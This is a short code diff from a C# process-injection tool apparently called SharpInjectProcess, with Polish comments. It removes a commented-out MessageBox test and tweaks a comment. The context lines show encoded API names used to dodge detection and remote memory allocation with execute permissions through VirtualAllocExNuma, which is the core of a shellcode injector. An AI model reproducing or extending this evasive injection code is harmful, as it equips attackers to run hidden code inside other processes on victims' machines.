@@ -173,12 +173,6 @@ namespace SharpInjectProcess
             IntPtr huser32dll = LoadLibrary(user32dll);
             IntPtr hkernel32dll = LoadLibrary(kernel32dll);
 
-            // Znalezienie wskaznika na funkcje MessageBoxA
-            //string strMessageBox = "MessageBoxA";
-            //IntPtr hMessageBox = GetProcAddress(huser32dll, strMessageBox);
-            //Type_MessageBox mb = (Type_MessageBox)Marshal.GetDelegateForFunctionPointer(hMessageBox, typeof(Type_MessageBox));
-            //mb(IntPtr.Zero, "Justtest", "Justfortest", 0);
-
 
             // znalezienie wskaznika na OpenProcess i zdefiniowanie open process
             byte[] e_op = { 0xef, 0xd0, 0xc5, 0xce, 0xf0, 0xd2, 0xcf, 0xc3, 0xc5, 0xd3, 0xd3 };
@@ -221,7 +215,7 @@ namespace SharpInjectProcess
             // USUŃ NIEPOTRZEBNY TYP I WSKAŹNIK DO NIEPOTRZEBNEJ FUNKCJI
 
             // TRADYCYJNIE:
-            //IntPtr memaddr = vaxn(prochandle, IntPtr.Zero, (uint)buflen, 0x3000, 0x40);
+            //IntPtr memaddr = vax(prochandle, IntPtr.Zero, (uint)buflen, 0x3000, 0x40);
 
             // VirtualAllocExNuma:
             IntPtr memaddr = vaxn(prochandle, IntPtr.Zero, (uint)buflen, 0x3000, 0x40,0);
